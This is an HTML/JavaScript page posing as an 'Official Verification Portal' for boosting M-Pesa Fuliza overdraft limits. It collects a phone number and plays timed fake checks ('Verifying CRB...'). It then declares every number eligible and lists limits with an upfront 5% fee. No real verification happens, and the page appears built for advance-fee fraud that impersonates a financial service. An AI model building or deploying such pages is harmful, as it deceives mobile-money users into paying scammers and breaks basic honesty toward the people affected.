<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Fuliza Boost</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f3f4f6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: white;
      padding: 20px;
      border-radius: 16px;
      width: 320px;
      text-align: center;
      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
    }
    input {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border-radius: 10px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 15px;
      width: 100%;
      padding: 12px;
      background: green;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }
    .hidden { display: none; }
  </style>
</head>
<body>

<div class="card" id="app">
  <h2>Fuliza Plus+</h2>
  <p>Official Verification Portal</p>

  <div id="step1">
    <input id="phone" placeholder="Enter M-Pesa Number"/>
    <button onclick="start()">Check My Eligibility</button>
  </div>

  <div id="loading" class="hidden">
    <h3 id="loadingText">Connecting...</h3>
  </div>

  <div id="success" class="hidden">
    <h2>✅ Congratulations!</h2>
    <p id="result"></p>
    <button onclick="showLimits()">Proceed to Upgrade</button>
  </div>

  <div id="limits" class="hidden">
    <h3>Select Your Limit</h3>
    <div id="list"></div>
  </div>
</div>

<script>
  function start() {
    const phone = document.getElementById("phone").value;
    if (!phone) return alert("Enter phone number");

    document.getElementById("step1").classList.add("hidden");
    document.getElementById("loading").classList.remove("hidden");

    let texts = [
      "Connecting...",
      "Verifying CRB...",
      "Checking Usage..."
    ];

    let i = 0;
    let interval = setInterval(() => {
      document.getElementById("loadingText").innerText = texts[i];
      i++;
      if (i >= texts.length) {
        clearInterval(interval);
        showSuccess(phone);
      }
    }, 1500);
  }

  function showSuccess(phone) {
    document.getElementById("loading").classList.add("hidden");
    document.getElementById("success").classList.remove("hidden");
    document.getElementById("result").innerText =
      phone + " is eligible for a boost.";
  }

  function showLimits() {
    document.getElementById("success").classList.add("hidden");
    document.getElementById("limits").classList.remove("hidden");

    let amounts = [3000,5000,7500,10000,16000,25000,45000,60000];
    let list = document.getElementById("list");

    amounts.forEach(a => {
      let div = document.createElement("div");
      div.innerHTML = `<p>Ksh ${a} (Fee: ${Math.floor(a*0.05)})</p>`;
      list.appendChild(div);
    });
  }
</script>

</body>
</html>
